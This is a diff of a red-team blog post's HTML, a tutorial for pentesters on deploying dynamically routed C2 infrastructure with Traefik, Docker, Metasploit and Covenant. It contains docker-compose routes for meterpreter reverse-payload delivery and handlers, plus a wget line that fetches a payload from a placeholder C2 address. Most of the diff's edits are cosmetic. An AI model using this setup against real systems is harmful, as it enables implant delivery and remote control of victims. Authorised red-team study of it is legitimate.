@@ -6,7 +6,7 @@
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Abstract Setup 🔧  Using docker-compose Traefik Metasploit   Running the initial delivery chain 💥  Monitoring the C2 routing in Traefik&amp;rsquo;s web interface   Covenant C2 Setup 🔧 Running the second delivery chain 💥 Notes  Abstract This blog post&amp;rsquo;s objective is helping pentesters catch up on recent deployment innovations, solving some traditional pain points thanks to container-based infrastructure.
+<meta name="description" content="Abstract Setup 🔧  Using docker-compose Traefik Metasploit   Running the initial delivery chain 💥  Monitoring the C2 routing in the Traefik web interface   Covenant C2 Setup 🔧 Running the second delivery chain 💥 Notes  Abstract This blog post&amp;rsquo;s objective is helping pentesters catch up on recent deployment innovations, solving some traditional pain points thanks to container-based infrastructure.
 These modern infrastructures can seamlessly evolve and scale across hosts, servers and even countries."/>
 <meta name="keywords" content=""/>
 <meta name="robots" content="noodp"/>
@@ -26,44 +26,23 @@ These modern infrastructures can seamlessly evolve and scale across hosts, serve
 <link rel="shortcut icon" href="https://khast3x.club/img/favicon.png">
 
 
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://khast3x.club/assets/demo/haunter_alt.png"/>
-
+<meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker"/>
-<meta name="twitter:description" content="Deploy a scalable, automated, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!"/>
+<meta name="twitter:description" content="Deploy a scalable, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!"/>
 
 
 
 <meta property="og:title" content="Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker" />
-<meta property="og:description" content="Deploy a scalable, automated, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!" />
+<meta property="og:description" content="Deploy a scalable, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/" />
-<meta property="og:image" content="https://khast3x.club/assets/demo/haunter_alt.png"/>
-<meta property="article:published_time" content="2020-02-20T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-02-20T00:00:00+00:00" /><meta property="og:site_name" content="khast3x blog" />
+<meta property="article:published_time" content="2020-02-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-02-14T00:00:00+00:00" /><meta property="og:site_name" content="khast3x blog" />
 
 
 
 
 
-
-    <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://khast3x.club/assets/demo/haunter_alt.png"/>
-
-<meta name="twitter:title" content="Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker"/>
-<meta name="twitter:description" content="Deploy a scalable, automated, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!"/>
-
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-113498686-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
 
   </head>
   <body class="dark-theme">
@@ -125,14 +104,22 @@ if (!doNotTrack) {
 
       <div class="content">
         
+  
+  
+
   <div class="post">
-    <h2 class="post-title"><a href="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/">Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker</a></h2>
+    <h1 class="post-title"><a href="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/">Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker</a></h1>
     <div class="post-meta">
       
         <span class="post-date">
-            2020-02-20
+          2020-02-14
         </span>
+
+        
+          
+        
       
+
       
       
     </div>
@@ -154,6 +141,7 @@ if (!doNotTrack) {
     
 
     <div class="post-content">
+      
       <ul>
 <li><a href="#abstract">Abstract</a></li>
 <li><a href="#setup-">Setup 🔧</a>
@@ -165,7 +153,7 @@ if (!doNotTrack) {
 </li>
 <li><a href="#running-the-initial-delivery-chain-">Running the initial delivery chain 💥</a>
 <ul>
-<li><a href="#monitoring-the-c2-routing-in-the-traefik-web-interface">Monitoring the C2 routing in Traefik&rsquo;s web interface</a></li>
+<li><a href="#monitoring-the-c2-routing-in-the-traefik-web-interface">Monitoring the C2 routing in the Traefik web interface</a></li>
 </ul>
 </li>
 <li><a href="#covenant-c2-setup-">Covenant C2 Setup 🔧</a></li>
@@ -176,16 +164,16 @@ if (!doNotTrack) {
 <p><em>This blog post&rsquo;s objective is <strong>helping pentesters catch up on recent deployment innovations</strong>, solving some traditional pain points thanks to container-based infrastructure.</em></p>
 <p><em>These modern infrastructures can seamlessly <strong>evolve and scale</strong> across hosts, servers and even countries. They can be summoned and deployed in a matter of seconds, <strong>repeatedly</strong>, across the world. They can be continuously changing shape and size, and still <strong>transparently</strong> route traffic however we want.</em> <br>
 <strong><em>We&rsquo;re doing that last part in this blog post</em> 🔥</strong></p>
-<p><em>These kind of infrastructures can do many other things, such as natively load-balancing your handlers, optimizing your implant sessions based on distributed metrics, streamed across your services.</em></p>
+<p><em>This kind of infrastructure can do many other things, such as natively load-balancing your handlers, optimizing your implant sessions based on distributed metrics, streamed across your services.</em></p>
 <hr>
 <p><strong>What</strong></p>
 <p>For now, we want to deploy a more evolved red teaming infrastructure that can dynamically create routes to our C2 Docker containers, instead of manually editing a configuration file every time we want a new route from our reverse-proxy.<br>
 We also want it to be easy to scale, and easy to monitor.</p>
 <p><strong>How</strong></p>
-<p>The traditional method is to use Apache or NGINX, and use <code>Reverse-Proxy</code> static configurations to map our routes. Or manual Socats.</p>
+<p>The traditional method is to use Apache or NGINX, and use <code>Reverse-Proxy</code> static configurations to map our routes.</p>
 <p>In this post, we&rsquo;re going to use <a href="https://github.com/containous/traefik">Traefik v2</a> instead.<br>
 Traefik will enable us to easily manage dynamic routes, and deploy C2 containers with smooth forwarding to our payloads and session handlers.</p>
-<p>🔸 We&rsquo;ll first deploy Traefik, routing to our <a href="https://hub.docker.com/r/metasploitframework/metasploit-framework/">Metasploit</a> container with two different payloads: <code>meterpreter_reverse_ http</code> and <code>meterpreter_reverse_tcp</code>.<br>
+<p>🔸 We&rsquo;ll first deploy Traefik routing to our <a href="https://hub.docker.com/r/metasploitframework/metasploit-framework/">Metasploit</a> container, with two different payloads: <code>meterpreter_reverse_ http</code> and <code>meterpreter_reverse_tcp</code>.<br>
 🔸 We&rsquo;ll then run a separate <a href="https://github.com/cobbr/Covenant">Covenant C2</a> container, that will spawn a new route to its web UI, payload and session handler.<br>
 🔸 <strong>We&rsquo;ll first target Linux with Metasploit, then Windows with Covenant.</strong></p>
 <p>Once done, we&rsquo;ll have an elastic reverse-proxy, functional routes to two different C2 containers with payloads and handlers, and the knowledge to summon many more at will. And a nice route monitoring UI.</p>
@@ -228,7 +216,7 @@ $ echo <span style="color:#e6db74">&#34;C2EXTIP=YOUR-C2-EXT-IP&#34;</span> &gt; 
 <p>Since it is a binary, you can simply <code>wget</code> it from the <a href="https://github.com/docker/compose/releases/download">official release page</a>. As of writing the version is <code>1.25.3</code>, change to latest version in the URL accordingly.</p>
 <p>🔹 To install docker-compose:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo -s <span style="color:#75715e"># If not running as root</span>
-$ curl -L <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">https://github.com/docker/compose/releases/download/1.25.3/docker-compose-</span><span style="color:#66d9ef">$(</span>uname -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">-</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> -o /usr/local/bin/docker-compose
+$ curl -L <span style="color:#e6db74">&#34;https://github.com/docker/compose/releases/download/1.25.3/docker-compose-</span><span style="color:#66d9ef">$(</span>uname -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">-</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> -o /usr/local/bin/docker-compose
 $ chmod +x /usr/local/bin/docker-compose
 $ docker-compose --version <span style="color:#75715e"># Check that it is installed correctly. Might need to reload shell</span>
 </code></pre></div><p>You can read the <a href="https://docs.docker.com/compose/install/">documentation page</a> for more detailed installation instructions.</p>
@@ -325,11 +313,12 @@ $ docker-compose --version <span style="color:#75715e"># Check that it is instal
 </ul>
 <p>🔹 We&rsquo;re going to create our <code>docker-compose.yml</code> file and start adding Traefik:</p>
 <pre><code>$ nano docker-compose.yml
-</code></pre><p>🔹 And add the following:</p>
+</code></pre><!-- raw HTML omitted -->
+<p>🔹 And add the following:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">version: <span style="color:#e6db74">&#34;3.7&#34;</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>  traefik:<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    image: <span style="color:#e6db74">&#34;traefik:v2.1&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    container_name: <span style="color:#e6db74">&#34;traefik&#34;</span><span style="color:#960050;background-color:#1e0010">
@@ -348,7 +337,7 @@ $ docker-compose --version <span style="color:#75715e"># Check that it is instal
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.api.service=api@internal&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.api.middlewares=auth&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># test:test</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.middlewares.auth.basicauth.users=test:</span>$$<span style="color:#e6db74">apr1</span>$$<span style="color:#e6db74">241s8k7o</span>$$<span style="color:#e6db74">W8AhFxO9ctEtjWHbXKsKp0</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.middlewares.auth.basicauth.users=test:</span>$$<span style="color:#e6db74">apr1</span>$$<span style="color:#e6db74">241s8k7o</span>$$<span style="color:#e6db74">W8AhFxO9ctEtjWHbXKsKp0&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>     <span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    ports:<span style="color:#960050;background-color:#1e0010">
@@ -357,7 +346,7 @@ $ docker-compose --version <span style="color:#75715e"># Check that it is instal
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;8888:8888&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    volumes:<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;/var/run/docker.sock:/var/run/docker.sock:ro&#34;</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
 </span></code></pre></div><p>That&rsquo;s it for Traefik&rsquo;s main configuration.</p>
 <p>The rest of the Traefik configuration will be done using Docker labels, which is just custom meta-data we can add to our containers.</p>
 <h3 id="metasploit">Metasploit</h3>
@@ -373,8 +362,7 @@ This has the advantage of being potentially used as a self-destruct mechanism fo
 <li>One server delivering the meterpreter_reverse_http from <code>:8080/delivery_http</code>, and spawning a handler on port 4444.</li>
 <li>One server delivering the meterpreter_reverse_tcp from <code>:8081/delivery_tcp</code>, and spawning a handler on port 4445.</li>
 </ul>
-<p>We&rsquo;re targeting Linux x64 using two different Meterpreter reverse payloads.
-If you wish to target something else (Windows, OSX), use <code>show targets</code> and <code>show payloads</code> and set the <code>TARGET</code> and <code>PAYLOAD</code> options accordingly.</p>
+<p>We&rsquo;re targeting Linux x64 using two different Meterpreter reverse payloads. If you wish to target something else (Windows, OSX), use <code>show targets</code> and <code>show payloads</code> and set the <code>TARGET</code> and <code>PAYLOAD</code> options accordingly.</p>
 <p>Alternatively, you may also start <code>./msfconsole</code> without any resource file and configure it manually.</p>
 <p>🔹 Open the new resource file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nano double_delivery.rc
@@ -414,11 +402,10 @@ run
 <p>🔹 Open our previously created docker-compose file:</p>
 <pre><code>$ nano docker-compose.yml
 </code></pre><p>🔹 And copy the following after the Traefik service we added earlier:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># ** snip ** </span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#75715e"># ** snip ** </span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Traefik declaration block above</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Note that the msf block is indented</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>  msf:<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    image: <span style="color:#e6db74">&#34;metasploitframework/metasploit-framework&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    container_name: <span style="color:#e6db74">&#34;msf&#34;</span><span style="color:#960050;background-color:#1e0010">
@@ -429,17 +416,17 @@ run
 </span><span style="color:#960050;background-color:#1e0010"></span>    labels:<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Payload Delivery - host/delivery_http to msf:8080</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.msfDelivery.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/delivery_http`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDelivery.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/delivery_http`)&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDelivery.service=msfDelivery@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDelivery.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.msfDelivery.loadbalancer.server.port=8080&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># TCP Payload Delivery - host/delivery_tcp to msf:8081</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.msfDeliveryTcp.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/delivery_tcp`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDeliveryTcp.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/delivery_tcp`)&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDeliveryTcp.service=msfDeliveryTcp@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDeliveryTcp.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.msfDeliveryTcp.loadbalancer.server.port=8081&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Payload Handler host/handler to msf:4444</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.msfHandler.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/handler`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfHandler.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/handler`)&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfHandler.service=msfHandler@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfHandler.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.msfHandler.loadbalancer.server.port=4444&#34;</span><span style="color:#960050;background-color:#1e0010">
@@ -478,9 +465,9 @@ $  wget -qO tcpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_tcp
 </a></p>
 <p><em>Tip: You can quickly spawn a dedicated Linux target to run your payloads using Docker. On your host, run <code>docker run -it alpine sh</code> to get a quick shell to a small new Linux container.<br>
 Your host might need to match the targeted architecture.</em></p>
-<h3 id="monitoring-the-c2-routing-in-traefiks-web-interface">Monitoring the C2 routing in Traefik&rsquo;s web interface</h3>
+<h3 id="monitoring-the-c2-routing-in-the-traefik-web-interface">Monitoring the C2 routing in the Traefik web interface</h3>
 <p>If you recall earlier, we activated Traefik&rsquo;s Web UI, with a route and a simple authentication using <code>test:test</code>.</p>
-<p>🔹 Head to <code>http://YOUR-C2-EXT-IP/dashboard/#</code> to monitor all your live routes.</p>
+<p>🔹 Head to <code>http://YOUR-C2-EXT-IP/dashboard/#</code> to monitor all the live routes.</p>
 <hr>
 <h2 id="covenant-c2-setup-">Covenant C2 Setup 🔧</h2>
 <p>Now that we&rsquo;ve successfully deployed our stack, let&rsquo;s deploy our second C2.<br>
@@ -493,7 +480,7 @@ $ docker build -t covenant Covenant/Covenant <span style="color:#75715e"># Give 
 </code></pre></div><p>(<a href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup">source</a>)</p>
 <p><strong>We&rsquo;re going to create a separate docker-compose yaml file that is meant to be used on the side</strong>, dedicated to bringing the built Covenant container into our existing C2 infrastructure.</p>
 <p>We could use the <code>build</code> directive directly in our yaml file, but that would rebuild at launch. So we&rsquo;re building the container just once first, and spawning it second.</p>
-<p>Since Covenant does not currently allow us to disable HTTPS for the Web UI, we&rsquo;ll have to use SSL passthrough on the TCP layer directly, instead of using Traefik&rsquo;s HTTP router. The web interface is really neat so we want that to work nicely.<br>
+<p>Since Covenant does not currently allow us to disable HTTPS for the Web UI, we&rsquo;ll have to use SSL passthrough on the TCP layer directly, instead of using Traefik&rsquo;s HTTP router.<br>
 Fortunately, Traefik supports TCP routing as of version 2.<br>
 That is why the <code>tls-ep</code> entry point is currently configured as a TCP router in Traefik&rsquo;s configuration.</p>
 <p>We&rsquo;re adding three routes to the existing infrastructure:</p>
@@ -507,9 +494,9 @@ That is why the <code>tls-ep</code> entry point is currently configured as a TCP
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nano covenant-docker-compose.yml
 </code></pre></div><p>🔹 Copy the following, save and exit:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">version: <span style="color:#e6db74">&#34;3.7&#34;</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>  covenant:<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    image: <span style="color:#e6db74">&#34;covenant&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    container_name: <span style="color:#e6db74">&#34;covenant&#34;</span><span style="color:#960050;background-color:#1e0010">
@@ -521,12 +508,12 @@ That is why the <code>tls-ep</code> entry point is currently configured as a TCP
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.services.covenantUi.loadbalancer.server.port=7443&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.covenantUi.entrypoints=tls-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Delivery - host/cov_delivery to covenant:80</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.covenantDelivery.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/cov_delivery`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantDelivery.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/cov_delivery`)&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantDelivery.service=covenantDelivery@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantDelivery.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.covenantDelivery.loadbalancer.server.port=80&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Payload Handler - host/cov_handler to covenant:80</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.covenantHandler.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/cov_handler`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantHandler.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/cov_handler`)&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantHandler.service=covenantHandler@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantHandler.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.covenantHandler.loadbalancer.server.port=80&#34;</span><span style="color:#960050;background-color:#1e0010">
@@ -672,12 +659,12 @@ Take a minute to contemplate your success, and the new paths you have opened to 
 <p><img src="https://media.giphy.com/media/IbmVEYuOKVgvDndnf7/giphy.gif" alt=""></p>
 <p>🐚 💛 💀 💚 🐚 💙 💀 💜 🐚</p>
 <p><em>I hope you had a good time.</em><br>
-<em>If you enjoyed this post, you can <a href="https://twitter.com/kh4st3x">follow me on Twitter</a> to stay updated.</em><br>
+<em>If you enjoyed this post, you can <a href="todo">follow me on Twitter</a> to stay updated.</em><br>
 <em>Cheers!</em></p>
 <p><em>k</em></p>
 <p>🐚 💛 💀 💚 🐚 💙 💀 💜 🐚</p>
 <h2 id="notes">Notes</h2>
-<p>Related subjects we have not covered in this post, for those who want to go further down the rabbit-hole 🐇:</p>
+<p>Related subjects we have not covered in this post, for those who want to go further down the rabbit-hole 🐰:</p>
 <ul>
 <li>Using HTTPS with handlers and web interfaces behind Traefik</li>
 <li>Using Let&rsquo;s Encrypt automation</li>
@@ -688,15 +675,19 @@ Take a minute to contemplate your success, and the new paths you have opened to 
 <li>Expanding the infrastructure with Docker swarm or AWS Beanstalk</li>
 <li>Routing evasion techniques</li>
 </ul>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<blockquote>
+</blockquote>
 
     </div>
     
-    
+
 
     
       
     
-    
+
     </div>
 
       </div>
@@ -730,6 +721,21 @@ Take a minute to contemplate your success, and the new paths you have opened to 
 
       
     </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-113498686-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
 
     
   </body>
